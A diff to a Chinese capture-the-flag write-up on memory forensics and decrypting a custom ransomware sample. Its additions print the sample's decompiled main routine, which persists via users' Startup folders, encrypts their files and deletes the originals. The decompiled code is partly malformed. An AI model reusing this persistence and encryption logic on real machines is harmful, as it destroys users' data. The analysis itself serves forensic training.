@@ -25,13 +25,15 @@ Luminoria 的单位给他配了一台工作电脑，虽然它的配置很高，�
 
 作答的时候需要将四个问题的答案用下划线连接后，套上 `flag{}` 头进行作答，假设答案为 `ExampleAccount` `CVE-2025-8088` `AABBCCDD` `thiS-iS-4_t0k3n`，那么最后作答的答案应该为 `flag{10.0.0.8_ExampleAccount_CVE-2025-8088_AABBCCDD_thiS-iS-4_t0k3n}`
 
+> 被加密的文件是随附件给的两个 `.paff` 文件
+
 ## 解题
 
 本题主要是当时在羊城杯打了一个病毒+内存取证组合的题目，所以我也想出一个来玩玩，于是就出现了这么一个题目。
 
 ### 以正确的方式打开
 
-首先，这题是一题内存取证，所以我们要用合适的工具打开，你也可以用 Vol2/3 都是没问题的，不过我在这里推一个 LovelyMem 系列（Lite 免费，Luxe 收费，可以用 Lite 做）
+首先，这题是一题内存取证，所以我们要用合适的工具打开，你也可以用 Vol2/3/MemProcFS 都是没问题的，不过我在这里推一个 LovelyMem 系列（Lite 免费，Luxe 收费，可以用 Lite 做）
 
 我下面直接用 Luxe 了
 
@@ -39,7 +41,7 @@ Luminoria 的单位给他配了一台工作电脑，虽然它的配置很高，�
 
 我们得知道账户从哪里获取，在内存取证中，我们一般通过注册表获取账户
 
-而这个过程通常用 MemProcFS，因为它的注册表注册表数据比较全。在 MemProcFS 中，我们选择注册表时间线功能，直接搜索 `HKLM\SAM\SAM\Domains\Account\Users\Names`，后面的就是用户名了
+而这个过程通常用 MemProcFS，因为它的注册表注册表数据比较全。在 MemProcFS 中，你可以直接打开 M 盘然后看，我这里用工具。我们选择注册表时间线功能，直接搜索 `HKLM\SAM\SAM\Domains\Account\Users\Names`，后面的就是用户名了
 
 ![](https://cdn.bili33.top/gh/GDUTMeow/Challenge-Dangerous-Worm/Writeup/img/LovelymemLuxe_3GN2VZa27O.png)
 
@@ -55,7 +57,9 @@ Luminoria 的单位给他配了一台工作电脑，虽然它的配置很高，�
 
 但是第五个 `PaffCream$`，这里带了个 `$`，是个影子账户，可以认为是攻击者创建的账户，所以第一个问题的答案为 `PaffCream$`
 
-### 利用的漏洞（推断）
+> 取证经验：带 `$` 的账户名一般都要重点关注一下
+
+### 推断利用的漏洞
 
 题目里面说是攻击者通过 Paff 的电脑作为跳板来攻击 Luminoria 的电脑的，所以一定是利用了某个漏洞进行的，我们先查看电脑上现在有什么服务，用 Vol3 查看一下
 
@@ -135,7 +139,7 @@ You can now use a python decompiler on the pyc files within the extracted direct
 $ pylingual .\main.pyc
 ```
 
-结果反编译出来发现是个调用起
+结果反编译出来发现是个调用器
 
 ```python
 # Decompiled with PyLingual (https://pylingual.io)
@@ -154,7 +158,96 @@ if __name__ == '__main__':
 $ pylingual __init__.pyc cipher.pyc context.pyc utils.pyc vars.pyc
 ```
 
-然后就可以得到大部分源码了，通过 `context.py` 可以看到，这里有密钥的位置和目标
+然后就可以得到大部分源码了，这里的 `__init__.py` 就是整个过程的调用
+
+```python
+# Decompiled with PyLingual (https://pylingual.io)
+# Internal filename: 'encryptor\\__init__.py'
+# Bytecode version: 3.8.0rc1+ (3413)
+# Source timestamp: 1970-01-01 00:00:00 UTC (0)
+
+import os
+import sys
+from encryptor.cipher import encrypt
+from encryptor.context import SECRET_PATH, TARGET
+from encryptor.vars import Global
+from encryptor.utils import get_all_user_profiles
+def main():
+    # irreducible cflow, using cdg fallback
+    PC_NAME = os.getenv('COMPUTERNAME', 'UnknownPC')
+    if PC_NAME.startswith('LUMINE'):
+        return
+    else:
+        current_executable_path = sys.executable
+        executable_name = os.path.basename(current_executable_path)
+        all_users = get_all_user_profiles()
+        print(f'[*] Found user profiles: {all_users}')
+        for username in all_users:
+            pass
+        user_profile = os.path.join(os.getenv('SystemDrive', 'C:'), '\\Users', username)
+        startup_path = os.path.join(user_profile, 'AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+        destination_path = os.path.join(startup_path, executable_name)
+        if not os.path.exists(destination_path):
+            os.makedirs(startup_path, exist_ok=True)
+            with open(current_executable_path, 'rb') as src_file, open(destination_path, 'wb') as dst_file:
+                    dst_file.write(src_file.read())
+            except Exception:
+                continue
+    for username in all_users:
+        print(f'\n[+] Now targeting user: {username}')
+        user_profile_path = os.path.join(os.getenv('SystemDrive', 'C:'), '\\Users', username)
+        user_appdata_path = os.path.join(user_profile_path, 'AppData', 'Roaming')
+        user_secret_path = SECRET_PATH.replace('%APPDATA%', user_appdata_path)
+        print(f'[*] Initializing key for user \'{username}\' at: {user_secret_path}')
+        PARAMS_FOR_THIS_USER = Global(user_secret_path)
+        for target_template in TARGET:
+                processed_path = target_template.replace('%USERNAME%', username)
+                processed_path = processed_path.replace('%APPDATA%', user_appdata_path)
+                processed_path = processed_path.replace('%USERPROFILE%', user_profile_path)
+                print(f'[*] Scanning target folder: {processed_path}')
+                if not os.path.exists(processed_path):
+                    continue
+                else:
+                    for root, _, files in os.walk(processed_path):
+                        for file in files:
+                                if file.endswith('.paff'):
+                                    continue
+                                else:
+                                    file_path = os.path.join(root, file)
+                                    with open(file_path, 'rb') as f:
+                                        data = f.read()
+                                    if not data or data.startswith(b'PAFF'):
+                                        encrypted_data = encrypt(data, PARAMS_FOR_THIS_USER)
+                                        with open(file_path + '.paff', 'wb') as f:
+                                            f.write(b'PAFF' + encrypted_data)
+                                        if os.path.exists(file_path + '.paff'):
+                                            print(f'[+] Successfully encrypted: {file_path}')
+                                        else:
+                                            print(f'[-] Failed to encrypt: {file_path}')
+                                        os.remove(file_path)
+                                            except Exception as e:
+                                                    print(f'[-] Failed to process file: {file_path} with error: {e}')
+                    except Exception as e:
+                        print(f'[!] A critical error occurred while processing user \'{username}\': {e}')
+if __name__ == '__main__':
+    main()
+```
+
+> 注：这里的检测计算机名称是否为 `LUMINE` 开头是防呆设计，毕竟我不想我误触了然后给我电脑干了
+> ```python
+>     PC_NAME = os.getenv('COMPUTERNAME', 'UnknownPC')
+>     if PC_NAME.startswith('LUMINE'):
+>         return
+> ```
+
+`__init__.py` 主要做了这么几件事情
+
+- 获取计算机中的所有用户
+- 自我增殖到每个用户的开机自启目录
+- 为每个用户生成一个密钥
+- 利用生成的密钥对目标文件夹的文件进行特定方式的加密
+
+通过 `context.py` 可以看到，这里有密钥的位置和目标
 
 ```python
 SECRET_PATH = '%APPDATA%\\Microsoft\\Crypto\\Keys\\TPM.key'
@@ -228,6 +321,11 @@ print(real_iv.hex())
 至此，我们拿到了所有加密用的东西，可以去解密了，我们把两个加密后的文件拿出来，丢进赛博厨子
 
 因为加密之后还加了一个 `PAFF` 魔术头才保存的，所以要先去掉
+
+```python
+with open(file_path + ".paff", "wb") as f:
+    f.write(b"PAFF" + encrypted_data)
+```
 
 然后在 `Secr3t.db.paff` 解密后可以看到有一个 `My Token is:`，后面的 UUID 就是密钥了：`303c535a-1a26-4dbc-8034-64be01627d78`
 
